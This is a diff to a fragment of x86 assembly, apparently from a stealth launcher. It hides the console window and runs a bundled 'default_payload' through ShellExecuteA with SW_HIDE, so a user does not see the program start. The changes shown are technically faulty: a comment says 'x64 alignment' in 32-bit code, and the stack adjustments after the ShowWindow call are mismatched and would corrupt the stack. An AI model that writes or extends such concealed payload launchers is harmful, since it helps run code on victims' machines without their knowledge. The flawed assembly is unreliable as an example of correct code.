@@ -106,9 +106,11 @@ stealth_init:
     test eax, eax
     jz no_console
     
+    sub esp, 8                      # Align stack for x64
     push 0                          # SW_HIDE
     push eax                        # console window handle
     call ShowWindow
+    add esp, 16                     # Clean up stack
     
 no_console:
     ret
@@ -122,7 +124,8 @@ normal_execution:
     push 1                          # SW_SHOWNORMAL
     push 0                          # lpDirectory
     push 0                          # lpParameters  
-    push OFFSET default_payload     # lpFile
+    lea eax, default_payload
+    push eax                        # lpFile
     push 0                          # lpOperation
     push 0                          # hwnd
     call ShellExecuteA
@@ -138,7 +141,8 @@ execute_payload_stealthily:
     push 0                          # SW_HIDE
     push 0                          # lpDirectory
     push 0                          # lpParameters
-    push OFFSET default_payload     # lpFile
+    lea eax, default_payload
+    push eax                        # lpFile
     push 0                          # lpOperation  
     push 0                          # hwnd
     call ShellExecuteA
